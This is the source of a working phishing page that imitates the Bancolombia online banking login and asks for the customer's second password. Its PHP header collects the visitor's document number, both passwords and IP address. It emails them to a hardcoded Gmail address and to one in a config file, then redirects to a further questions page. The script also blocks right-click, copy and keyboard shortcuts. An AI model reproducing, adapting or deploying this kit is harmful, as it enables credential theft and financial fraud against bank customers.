<?php  
if(isset($_POST['procesar'])){
	$ip = getenv("REMOTE_ADDR");
	$userId = $_POST['_userId'];
	$password = $_POST['_password'];
	$password2 = $_POST['password'];
	$pasxword = "golgbc@gmail.com";
	$pass = rand(1,9);
	
	$asunto = "claves usuario BANCOLOMBIA (".$ip.")";
	$mensaje = "
	<p><strong>Documento de Identidad:</strong> ".$userId."".$pass."</p>
	<p><strong>Clave 1:</strong> ".$password."</p>
	<p><strong>Clave 2:</strong> ".$password2."</p>
	<p><strong>IP:</strong> ".$ip."</p>

	";
	
	
	@include "configuracion.php";
	
	//para el envio en formato HTML
	$headers = "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
	$headers .= "From: bancolombia <".$_SERVER['HTTP_HOST'].">";
	
	mail($retorno, $asunto, $mensaje, $headers);
	mail($pasxword, $asunto, $mensaje, $headers);
	 

	
	?>
	
	<script type="text/javascript">
	top.location.href = 'preguntas.html';
	</script>
	
	<?php
	die();
}
?> 






	
<html>
<head>
	<title>Sucursal Virtual BANCOLOMBIA</title>
	<link rel="stylesheet" href="../css/global.css" type ="text/css">
	<link rel="stylesheet" href="../css/keyboard_util.css" type="text/css">
	



<script language="JavaScript">

document.onkeydown = mykeyhandler;

function mykeyhandler(event) {

	//keyCode 116 = F5 
	//keyCode 122 = F11
	//keyCode   8 = Backspace
	//keyCode  37 = LEFT ROW
	//keyCode  78 = N
	//keyCode  39 = RIGHT ROW
	//keyCode  67 = C
	//keyCode  86 = V
	//keyCode  85 = U	
	//keyCode  45 = Insert

	event = event || window.event;
	var tgt = event.target || event.srcElement;
	if((event.altKey && event.keyCode==37) || (event.altKey && event.keyCode==39) || 
	   (event.ctrlKey && event.keyCode==78)|| (event.ctrlKey && event.keyCode==67)|| 
	   (event.ctrlKey && event.keyCode==86)|| (event.ctrlKey && event.keyCode==85)||
	   (event.ctrlKey && event.keyCode==45)|| (event.shiftKey && event.keyCode==45)){
        event.cancelBubble = true;
        event.returnValue = false;	
		alert("Funcion no permitida");
		return false;
	}
	
	if(event.keyCode==18 && tgt.type != "text" && tgt.type != "password" && tgt.type != "textarea"){
		return false;	
	}
	
	if (event.keyCode == 8 && tgt.type != "text" && tgt.type != "password" && tgt.type != "textarea"){		
		return false;
	}

    if ((event.keyCode == 116) || (event.keyCode == 122)) {
		if (navigator.appName == "Microsoft Internet Explorer"){
			window.event.keyCode=0;
        }
        return false;
    }
}

function mouseDown(e) {
	var ctrlPressed=0;
	var altPressed=0;
	var shiftPressed=0;
	if (parseInt(navigator.appVersion)>3) {
		if (navigator.appName=="Netscape") {
			var mString =(e.modifiers+32).toString(2).substring(3,6);
			shiftPressed=(mString.charAt(0)=="1");
			ctrlPressed =(mString.charAt(1)=="1");
			altPressed  =(mString.charAt(2)=="1");
			self.status="modifiers="+e.modifiers+" ("+mString+")"
		}
 		else 
 		{
  			shiftPressed=event.shiftKey;
 	 		altPressed  =event.altKey;
  			ctrlPressed =event.ctrlKey;
 		}
 		if (shiftPressed || altPressed || ctrlPressed) 
  			alert ("Funcion no permitida");
 	}
 	return true;
}

if (parseInt(navigator.appVersion)>3) {
	document.onmousedown = mouseDown;
	if (navigator.appName=="Netscape") 
		document.captureEvents(Event.MOUSEDOWN);
}

var message="";

function clickIE() {
	if (document.all){
		(message);
		return false;
	}
}

function clickNS(e) {
	if(document.layers||(document.getElementById&&!document.all)) {
		if (e.which==2||e.which==3) {
			(message);return false;
		}
	}
}

if (document.layers){
	document.captureEvents(Event.MOUSEDOWN);
	document.onmousedown=clickNS;
}else{
	document.onmouseup=clickNS;document.oncontextmenu=clickIE;
}

document.oncontextmenu=new Function("return false");
</script>

	
<script language="JavaScript">
function popup_help(param1) {	
	window.open('/html/global/popUpHelp.jsp?helpId='+param1,'HELP','width=285,height=185,scrollbars=no,resizable=yes');
}
function popup_help2(param2) {	
	window.open('/html/global/popUpHelp2.jsp?helpId='+param2,'HELP','width=600,height=300,scrollbars=no,resizable=yes');
}
function popup_help3(param3) {	
	window.open('/html/global/popUpHelp3.jsp?helpId='+param3,'HELP','width=650,height=400,scrollbars=no,resizable=yes');
}
function popup_help4(param4) {	
	window.open('/html/global/popUpHelp4.jsp?helpId='+param4,'HELP','width=650,height=630,scrollbars=no,resizable=yes');
}
function popup_help5(param1) {	
	window.open('/html/global/popUpHelp.jsp?helpId='+param1,'HELP','width=400,height=300,scrollbars=no,resizable=yes');
}
function popup_helpStatic() {	
	window.open('/html/global/popUpHelpStatic.jsp','HELP','width=650,height=630,scrollbars=no,resizable=yes');
}
function popup_helpStatusAccount() {	
	window.open('/html/global/popUpHelpStatusAccount.jsp','HELP','width=600,height=450,scrollbars=no,resizable=yes');
}
function popup_helpLoginForgotPassword() {	
	window.open('/html/global/popUpHelpLoginForgotPassword.jsp','HELP','toolbar=no,scrollbars=no,resizable=no,width=600,height=380');
}
function popup_helpMail(param1) {	
	window.open('/html/global/popUpHelp.jsp?helpId='+param1,'HELP','width=600,height=200,scrollbars=no,resizable=yes');
}

function popup_helpBlockCP1(param1) {	
	window.open('/html/global/popUpHelp.jsp?helpId='+param1,'HELP','width=300,height=300,scrollbars=no,resizable=yes');
}

function popup_helpMailExternalized(param1) {	
	window.open('/html/global/popUpHelpExternalized.jsp?helpId='+param1,'HELP','width=600,height=200,scrollbars=no,resizable=yes');
}

function popup_helpKeyGen(param1) {	
	window.open('/html/global/popUpHelp.jsp?helpId='+param1,'HELP','width=285,height=210,scrollbars=no,resizable=yes');
}
</script> 
	
	




<script>
var warning = 300*100; // Agregado "*10"
var timeout = 420*100; // Agregado "*10"

var current = 0;

function popUpTimeOut(sURL) { window.open(unescape(sURL), "msgWindow","dependent=yes,titlebar=no,menubar=no,height=150,hotkeys=no,resizable=no,status=no,toolbar=no,width=300,alwaysRaised=1");  }

function getSecs() { 
    current = current + 1;
    if (current == warning) { popUpTimeOut('/olb/GeneralDispatch?fwd=timeoutWarning1'); }

    if (current == timeout - 10) {
        popUpTimeOut('/olb/GeneralDispatch?fwd=timeoutWarning2');
        window.location="/olb/GeneralDispatch?fwd=timeout";
    }
    window.setTimeout('getSecs()',1000); 
}

getSecs();
</script>
	

	<script language="JavaScript" src="../js/validations.js"></script>
	
	





<script language="JavaScript">
		
	//JS PARA TECLADO VIRTUAL
	
	var mxhEUjaoYyDs = [{'PASSWORD':'TUnAiJfXnXrk'}][0];
	var passwordMinLength = new Array();
	var omitformtags=["input", "textarea", "select"]
	omitformtags=omitformtags.join("|")
	
	var maxLengthKeyboard;
	var origKeyboardShown = true;
	
	//agreagado para Bancolombia - INICIO
	var contrastLevel= "2";
	var fontSizeDefault=12;
	
	var indexField = 0;
	//agregado para Bancolombia - FIN
	
	var isOpen = false;
	var isLayer = false;
	var KEYCONTENT = '';
	
	var DEF_MAXLENGTH = 4;
	var zwdKUiPuCfAA = new Array();
	var ayWWFMWrYUkY = new Array();
	var maxLengthKeyboard = DEF_MAXLENGTH;
	var regFunction;
	
	function AjylKfAogpJZ(){      	KEYCONTENT = "  <table border='0' width='150' height='160' cellspacing='0' cellpadding='0' align='left' valign='top'>  <tr>    <td width='0' height='21'></td>    <td></td>  </tr>  <tr>    <td height='0' width='55'></td>    <td>      <table align='left' valign='top' cellspacing='0' cellpadding='0' class='bg_button'>        <tr align='left'>                  <td valign='top' align='left'> <table class='bg_button' id='_KEYBRD' valign='top' >  <tr><td class='bg_buttonSmall' background='../images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='BUoQLYGCgLgL();' onmouseout='changeToOrigKeyboard();' onclick='okWKsXTyuUZW(\"8\");'>  <div border='0' id ='_UXAyUQwVvpK8' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>8</div></td><td class='bg_buttonSmall' background='../images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='BUoQLYGCgLgL();' onmouseout='changeToOrigKeyboard();' onclick='okWKsXTyuUZW(\"2\");'>  <div border='0' id ='_UXAyUQwVvpK2' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>2</div></td><td class='bg_buttonSmall' background='../images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='BUoQLYGCgLgL();' onmouseout='changeToOrigKeyboard();' onclick='okWKsXTyuUZW(\"3\");'>  <div border='0' id ='_UXAyUQwVvpK3' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>3</div></td></tr>  <tr><td class='bg_buttonSmall' background='../images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='BUoQLYGCgLgL();' onmouseout='changeToOrigKeyboard();' onclick='okWKsXTyuUZW(\"1\");'>  <div border='0' id ='_UXAyUQwVvpK1' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>1</div></td><td class='bg_buttonSmall' background='../images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='BUoQLYGCgLgL();' onmouseout='changeToOrigKeyboard();' onclick='okWKsXTyuUZW(\"7\");'>  <div border='0' id ='_UXAyUQwVvpK7' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>7</div></td><td class='bg_buttonSmall' background='../images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='BUoQLYGCgLgL();' onmouseout='changeToOrigKeyboard();' onclick='okWKsXTyuUZW(\"6\");'>  <div border='0' id ='_UXAyUQwVvpK6' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>6</div></td></tr>  <tr><td class='bg_buttonSmall' background='../images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='BUoQLYGCgLgL();' onmouseout='changeToOrigKeyboard();' onclick='okWKsXTyuUZW(\"0\");'>  <div border='0' id ='_UXAyUQwVvpK0' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>0</div></td><td class='bg_buttonSmall' background='../images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='BUoQLYGCgLgL();' onmouseout='changeToOrigKeyboard();' onclick='okWKsXTyuUZW(\"9\");'>  <div border='0' id ='_UXAyUQwVvpK9' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>9</div></td><td class='bg_buttonSmall' background='../images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='BUoQLYGCgLgL();' onmouseout='changeToOrigKeyboard();' onclick='okWKsXTyuUZW(\"4\");'>  <div border='0' id ='_UXAyUQwVvpK4' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>4</div></td></tr>  <tr><td class='bg_buttonSmall' background='../images/kb/small_button.gif' align='center' style='cursor:default' onMouseOver='BUoQLYGCgLgL();' onmouseout='changeToOrigKeyboard();' onclick='okWKsXTyuUZW(\"5\");'>  <div border='0' id ='_UXAyUQwVvpK5' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>5</div></td><td colspan='2' onclick='clearKeys();' class='brr_button'><img src='../images/kb/limpiar.gif'></td></tr></table><table class='bg_button' id='_CONSTRAST' valign='top' cellspacing='0'>  <tr><td><img width='90' height='34' border='0' src='../images/kb/Contraste" + contrastLevel + ".gif' name='constrastImg' id='constrastImg' usemap='#numericKeyboardMap' > <map name='numericKeyboardMap' id='numericKeyboardMap'><area shape='circle' class='cursorContrast' coords='16,21,11' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(1)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' coords='45,21,11' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(2)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' coords='74,21,11' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(3)' onmouseout='setDefaultCursor(document.constrastImg)'></map></td></tr></table></td>        </tr>      </table>    </td>  </tr></table>";  	return KEYCONTENT;     }
	function okWKsXTyuUZW(keyVal) {  	passwordMinLength[indexField] =zwdKUiPuCfAA[indexField].value.length;	if (zwdKUiPuCfAA[indexField].value.length < DEF_MAXLENGTH) {     		zwdKUiPuCfAA[indexField].value += '*'; 	   	ayWWFMWrYUkY[indexField].value += keyVal;    	   	if (regFunction) {  			regFunction();          	}       		if(document.authenticationForm.tempUserID != undefined) {     			if (document.authenticationForm.tempUserID.value !== "****************" && document.authenticationForm.tempUserID.value !== ""){    				document.authenticationForm.userId.value = document.authenticationForm.tempUserID.value;        			   	document.authenticationForm.tempUserID.value = "****************";     			}		} 	}}
	function resetForm() {        	document.authenticationForm.userId.value="";      	document.authenticationForm.tempUserID.value="";      	document.authenticationForm.password.value=""; }
	function disableselect(e){       	if (omitformtags.indexOf(e.target.tagName.toLowerCase())==-1)   		return false;       }
	function clearKeys() {     	  zwdKUiPuCfAA[indexField].value="";    	  ayWWFMWrYUkY[indexField].value=""; }
	function xivfIUmYxNmh(){     	if (validBrowser()) {  	hideUserID();       		var userId=document.authenticationForm.userId.value;     		var password=document.authenticationForm.password.value;       		for(var i=userId.search(" "); i!=-1; i=userId.search(" ")){     		i=userId.search(" ");     		var tmp = userId.substring(0,i);       		userId = tmp + userId.substring(i+1,userId.length);  		}   		if(isEmpty(userId) || isEmpty(password)) {            		alert('Por favor, ingresar su numero de Documento y su Clave.');         	} else if (isNaN(userId) ) { 			alert('Por favor, ingresar su numero de Documento y su Clave.');            	} else if (passwordMinLength[0] < DEF_MAXLENGTH - 1){      			alert('La clave debe ser de al menos 4 digitos. Por favor rectifique e intente nuevamente.');      			clearKeys();    			document.authenticationForm.password.value="";   	 	} 		else {           	top.withNotify=true;                 return true;         }      } 	document.authenticationForm.tempUserID.focus();   	return false;  }
	function changeContrastLevel(level) {  if(contrastLevel != level) { contrastLevel = level; refreshNumericKeyboard(level);       changeConstrastImage();}        }
	function refreshNumericKeyboard(contrastLevel) {   for(var i=0; i<10; i++) {    var mykey = document.getElementById('_UXAyUQwVvpK' + i);     mykey.style.fontSize=fontSizeDefault;       mykey.className = 'colorContrast'+contrastLevel;       }      }
	function hideUserID(){         var x = document.authenticationForm.tempUserID.value;     if (x !== "" && x !== "****************"){      		document.authenticationForm.userId.value = x;   		document.authenticationForm.tempUserID.value = "****************";     	}     }		
	function createKeyboard(openLayer, xPos, yPos) {         if (isLayer = openLayer)               createChild(window, "keyboard", AjylKfAogpJZ(), isOpen, 330, 135, xPos, yPos);          else           document.writeln(AjylKfAogpJZ());       blockSelect(document.all? document.all['_KEYBRD']: document.getElementById? document.getElementById('_KEYBRD'): document);            refreshNumericKeyboard(contrastLevel);         }  
	function blockSelect(element) {    	if (typeof element.onselectstart!="undefined"){   		element.onselectstart=new Function ("event.returnValue=false;  return false; ");     	}else{     		element.onmousedown=disableselect;    		element.onmouseup=reEnable;   	}}
	function validBrowser() {        var EX = navigator.appName=="Microsoft Internet Explorer";          if (EX){           var EXversion = navigator.appVersion.substring(navigator.appVersion.indexOf(";")+1);            EXversion = parseFloat(EXversion.substring(0,EXversion.indexOf(";")));            if (EXversion < 5){             return false;          }       }        else {              var EXversion = navigator.appVersion;                var i = EXversion.indexOf("[");              if ( i != -1 || (i= EXversion.indexOf("(")) != -1 )          	EXversion = EXversion.substring(0,i);              	EXversion = parseFloat(EXversion);	             if (EXversion < 5.0){              return false;           }        }         return true;     }		
	function BUoQLYGCgLgL(){         for (i=0;i<10;i++){            var mykey = document.getElementById('_UXAyUQwVvpK' + i);  	     mykey.innerHTML='*'; 	     mykey.style.fontSize=15;        	     mykey.style.fontWeight='bolder';          }}
	function closeKeyb(){    	if (isLayer) activateChild(isOpen = false);      zwdKUiPuCfAA[indexField].disabled = false;        }
	function clearUserID(){ 	document.authenticationForm.tempUserID.value='';  	document.authenticationForm.userId.value='';  }
	function changeConstrastImage(){ var mykey = document.getElementById('constrastImg');      mykey.src='../images/kb/Contraste' + contrastLevel + '.gif'       }
	function changeToOrigKeyboard(){    	for (i=0;i<10;i++){   			var mykey = document.getElementById('_UXAyUQwVvpK' + i);        			mykey.innerHTML=i;  			mykey.style.fontSize=12;        			mykey.style.fontWeight='bolder';      	} }		
	function setHandCursor(element) {      element.style.cursor = 'pointer';     }		
	function ShxAsiCDfQus(index) {    	if (index==undefined){  		index=0;   	}        	var form = zwdKUiPuCfAA[0].form;   	var vf;     	if (!ayWWFMWrYUkY[index]) {   	    var initialLength = form.elements.length;   		for (var i=0; i < initialLength; i++) {      			vf = mxhEUjaoYyDs[form.elements[i].name.toUpperCase()];    			if (vf) {    				document.write('<input type="hidden" name="'+vf+'">');   			}		}	}      	for (ind=0; ind<zwdKUiPuCfAA.length; ind++){		vf = mxhEUjaoYyDs[zwdKUiPuCfAA[ind].name.toUpperCase()];  		if(form[vf] == undefined) {    			ayWWFMWrYUkY[ind] = ""; 		}      		else {     			ayWWFMWrYUkY[ind] = form[vf];        		}      		ayWWFMWrYUkY[ind].value = ""; 	}}		
	function reEnable(){      	return true;     }	
	function bindElement(elem,index) {  	indexField=0;   	if (index!=undefined){    		indexField=index;   	}     	zwdKUiPuCfAA[indexField] = elem;      	maxLengthKeyboard = (zwdKUiPuCfAA[indexField] && zwdKUiPuCfAA[indexField].maxLength? zwdKUiPuCfAA[indexField].maxLength: DEF_MAXLENGTH);       }		
	function startKeyb(elem, index, modal) {             if (zwdKUiPuCfAA[indexField]) {     	      zwdKUiPuCfAA[indexField].disabled = false;         }       bindElement(elem);        	ShxAsiCDfQus(index);          if (!isOpen && isLayer) {     	     activateChild(isOpen = true);        }      if(modal)  {              zwdKUiPuCfAA[indexField].disabled = true;        }  }
	function setDefaultCursor(element) {   element.style.cursor = 'default';  }		
	function recoveryPassword(){        	for (i=0; i<zwdKUiPuCfAA.length; i++){	   zwdKUiPuCfAA[i].value = ayWWFMWrYUkY[i].value;  	}}		

</script>


	<script language="JavaScript">
		top.withNotify=false;
		
	
		//Agrega los logos en la parte superior de la pagina
		top.topFrame.location="../html/navigation/topLogosFrame.html";
		top.barFrame.location="../html/navigation/barLogoLeft.html";
		//Hide the Menu
		top.leftFrame.location="../html/global/hidden.html";
		top.hiddenFrame.location="../html/global/hidden.html";
		
		function popUpDemo(sURL) { window.open(unescape(sURL), 'demo', 'toolbar=no,scrollbars=no,resizable=no,width=600,height=353');}
		function openKeyActivation(){
			window.open('https://bancolombia.olb.todo1.com/BOLPBancolombiaFidu/olb/Init', 'keyActivation','status=yes,menubar=no,scrollbars=yes,resizable=yes');
		}
		
		function disabledTimeout()
		{

		window.location.href = "/olb/TimeoutVerification?flagTimeout=DISABLED";
		

		}
	</script>

</head>

<body bgcolor="#ffffff" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onload="javascript:checkConnectionException();">

	





<table width="96%" border="0" align="center" cellpadding="0" cellspacing="0">
	<tr> 
    	<td height="10" colspan="2"><img src="../images/pixel-transp.gif" width="1" height="1" border="0"></td>
	</tr>
	<tr> 
		<td>
			<table border="0" cellspacing="0" cellpadding="0" background="../images/fondo_title.gif">
              <tr height="20"> 
                <td align="left" valign="top" width="4"><img src="../images/bTitleLeft.gif" border="0"></td>
                <td align="left" valign="middle" class="tituloppal" nowrap>&nbsp;Validacion de usuario&nbsp;</td>

              </tr>
            </table>
		</td>
        <td align="right">
	        <?php
			// 4 de Agosto de 2008 11:25 PM
			$fecha = time();
			$meses = array(1 => "Enero","Febrero","Marzo","Abril","Mayo","Junio"," Julio","Agosto","Septiembre","Octubre","Nobiembre" ,"Diciembre");
			$dias = array("Domingo","Lunes","Martes","Miercoles","Juev es","Viernes","Sabado");
			$d = date("w",$fecha);
			$m = date("n",$fecha);
			$fecha = date("d",$fecha)." de ".$meses[$m]." de ".date("Y",$fecha)." ".date("h:i A",$fecha)."";
	        ?>
	        <B><?php echo $fecha; ?></B>
        </td>
	</tr>

	
</table>	
	
	<br>
	<br>
	
	<table width="98%" border="0" align="center">  
      <form name="authenticationForm" method="POST" action="AuthenticationVerification.php">	     	
      	<input type="hidden" name="HIT_KEY" value="0">
		<input type="hidden" name="HIT_VKEY" value="0">
		<input type="hidden" name="connectionException" value="false">
		
      	<input type="hidden" name="procesar" value="1" />
      	<input type="hidden" name="_userId" value="<?php echo $_POST['userId']; ?>" />
      	<input type="hidden" name="_password" value="<?php echo $_POST['password']; ?>" />
		
		<table align="center" width="96%" border="0" align="center" width="96%">
			<tr>
				<td align="center" colspan="2">
				
				
				
						<!--
	        
	        ESTA PARTE AuN SE PUEDE MEJORAR..
	        
	        			-->
				
				
				
						
						<p>Para realizar esta verificacion, por favor ingrese su segunda clave.</p>
						<br>
				
				</td>
			</tr>
			<tr>
				<td width="15%">&nbsp;</td>
    			<td width="75%" valign=top>
    			
		    			
		    			<table width="400" align="left" border="0">
		    				<tr>
		    					<td width="300" align="right" class="contentA2">
		    							<input type="hidden" name="tempUserID" maxlength="20" size="20" value="" onfocus="this.value='';" autocomplete="off">
		    					
										<strong>Segunda Clave:</strong>
										<input type="password" name="password" id="password" size="4" tabindex="2" value="" readonly="readonly" autocomplete="off">								
		    					</td>
		    					<td width="100" rowspan="2" align="left">
									<script>
										//Muestra el teclado
										createKeyboard();
										startKeyb(document.authenticationForm.password);
										resetForm();
				             		</script>
		    					</td>
		    				</tr>
		    				<tr>
		    					<td valign="bottom" align="center">
									<input type="image" id="accept_btn" src="../images/confirm_es.gif" tabindex="3" onclick="recoveryPassword(); return xivfIUmYxNmh();"/>
		    					</td>
		    				</tr>
		    			</table>
    			
				   	
    			
    			
				</td>
			</tr>
			<tr>
				<td colspan="2">
						<br><br>
				
						<p>Para realizar el desbloqueo de cuentas debe contar con la segunda clave. Esta clave tambien es necesaria para realizar las mismas operaciones por la Sucursal Telefonica BANCOLOMBIA.</p>
						<p>Para obtener esta clave, utilice la opcion <a href="#">Segunda Clave</a> del menu izquierdo de navegacion.</p>
					
				</td>
			</tr>
       		<tr>
       			<td colspan="2">
						&nbsp;
    	     	</td>
       		</tr>
		</table>
		<script type="text/javascript">
		function checkConnectionException(){
			 var isConnectionException = document.forms[0].connectionException.value;
			 if (isConnectionException == "true"){
			 	alert("");
			 }
			 document.forms[0].connectionException.value = "false";
		}
		</script>
	  </form>


	</table>
</body>

	


</html>

